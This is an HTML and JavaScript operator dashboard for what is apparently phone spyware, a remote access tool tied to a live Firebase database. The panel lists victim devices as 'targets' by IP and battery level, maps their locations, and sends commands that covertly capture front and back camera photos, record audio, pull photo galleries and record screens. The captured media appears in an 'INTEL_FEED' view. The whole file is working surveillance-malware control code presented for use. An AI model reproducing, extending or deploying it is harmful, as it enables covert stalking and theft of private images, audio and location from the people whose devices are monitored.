<!DOCTYPE html>
<html>
<head>
    <title>CMD_CENTER_PRO_V10</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
        .sidebar { width: 300px; border-right: 1px solid #333; padding: 15px; overflow-y: auto; }
        .target-item { border: 1px solid #222; padding: 10px; margin-bottom: 10px; cursor: pointer; }
        .target-item.active { border-color: var(--neon); background: rgba(0,255,65,0.05); }
        .main { flex: 1; padding: 20px; overflow-y: auto; }
        .btn { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 10px; margin: 5px; cursor: pointer; font-size: 11px; }
        .btn:hover { background: var(--neon); color: #000; }
        .panel-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .box { background: #111; border: 1px solid #222; padding: 15px; border-radius: 4px; }
        #map-frame { width: 100%; height: 250px; border: 1px solid #333; background: #000; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
        img, video { width: 100%; border: 1px solid #333; margin-top: 5px; }
    </style>
</head>
<body>

<div class="sidebar">
    <h3>CORE_CONTROLLER</h3>
    <div id="user-list">Fetching...</div>
</div>

<div class="main" id="view-panel" style="display:none;">
    <h2 id="current-user">Select Node</h2>
    <div class="controls">
        <button class="btn" onclick="sendCmd('photo')">FRONT CAM</button>
        <button class="btn" onclick="sendCmd('back_photo')">BACK CAM</button>
        <button class="btn" onclick="sendCmd('audio')">RECORD AUDIO</button>
        <button class="btn" onclick="sendCmd('gallery')">FETCH GALLERY</button>
        <button class="btn" onclick="sendCmd('screen')">SCREEN REC</button>
        <button class="btn" style="border-color:red;color:red;" onclick="deleteData()">WIPE DATA</button>
    </div>

    <div class="panel-grid" style="margin-top:20px;">
        <div class="box">
            <h3>LOCATION_TRACKER</h3>
            <div id="map-frame">No Data</div>
            <button class="btn" style="width:100%; margin-top:10px;" onclick="openExternalMap()">OPEN FULL SCREEN MAP</button>
        </div>
        <div class="box">
            <h3>SYSTEM_LOGS</h3>
            <div id="log-content">...</div>
        </div>
        <div class="box" style="grid-column: span 2;">
            <h3>INTEL_FEED</h3>
            <div id="intel-feed" class="gallery"></div>
        </div>
    </div>
</div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let selectedNode = null;
    let lastCoords = null;

    db.ref('targets').on('value', snap => {
        const container = document.getElementById('user-list');
        container.innerHTML = "";
        snap.forEach(child => {
            const id = child.key;
            const data = child.val();
            container.innerHTML += `<div class="target-item ${selectedNode==id?'active':''}" onclick="loadNode('${id}')">
                Node: ${id}<br><small>${data.info ? data.info.ip : '---'}</small>
            </div>`;
        });
    });

    function loadNode(id) {
        selectedNode = id;
        document.getElementById('view-panel').style.display = 'block';
        document.getElementById('current-user').innerText = "NODE_ID: " + id;

        // Info
        db.ref(`targets/${id}/info`).on('value', s => {
            const d = s.val() || {};
            document.getElementById('log-content').innerHTML = `IP: ${d.ip}<br>BATT: ${d.battery}<br>STATUS: ${d.status}<br>LAST_PING: ${d.last_seen}`;
        });

        // Location
        db.ref(`targets/${id}/location`).on('value', s => {
            lastCoords = s.val();
            if(lastCoords) {
                const embedUrl = `https://maps.google.com/maps?q=${lastCoords.lat},${lastCoords.lng}&t=k&z=15&ie=UTF8&iwloc=&output=embed`;
                document.getElementById('map-frame').innerHTML = `<iframe src="${embedUrl}" width="100%" height="100%" frameborder="0"></iframe>`;
            }
        });

        // Combined Media Feed
        db.ref(`targets/${id}`).on('value', s => {
            const feed = document.getElementById('intel-feed');
            feed.innerHTML = "";
            const data = s.val();
            if(data.photos) Object.values(data.photos).reverse().forEach(p => feed.innerHTML += `<img src="${p.img}">`);
            if(data.gallery) Object.values(data.gallery).forEach(g => feed.innerHTML += `<img src="${g.data}">`);
            if(data.audios) Object.values(data.audios).forEach(a => feed.innerHTML += `<audio src="${a.data}" controls></audio>`);
            if(data.screens) Object.values(data.screens).forEach(sc => feed.innerHTML += `<video src="${sc.data}" controls></video>`);
        });
    }

    function sendCmd(act) { db.ref(`commands/${selectedNode}`).set({ action: act, ts: Date.now() }); }
    function openExternalMap() { if(lastCoords) window.open(`https://www.google.com/maps?q=${lastCoords.lat},${lastCoords.lng}`); }
    function deleteData() { if(confirm("Clear database for this node?")) db.ref(`targets/${selectedNode}`).remove(); }
</script>
</body>
</html>
